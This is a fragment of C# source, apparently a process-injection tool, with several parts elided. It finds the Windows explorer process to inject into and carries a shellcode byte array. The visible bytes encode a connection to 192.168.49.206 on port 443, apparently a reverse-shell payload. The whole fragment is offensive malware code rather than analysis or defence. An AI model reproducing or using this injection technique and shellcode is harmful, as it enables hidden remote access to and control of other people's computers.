...
namespace Inject
{
    class Program
    {
        ...
        {
            //Get proccess ID for explorer first
            Process[] explorer = Process.GetProcessesByName("explorer");
            // Process is stored in an array so we need to go the the first array and grab id of it and store in a variable
            ...
            0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x31,0xce,0x41,0x54,0x49,0x89,0xe4,
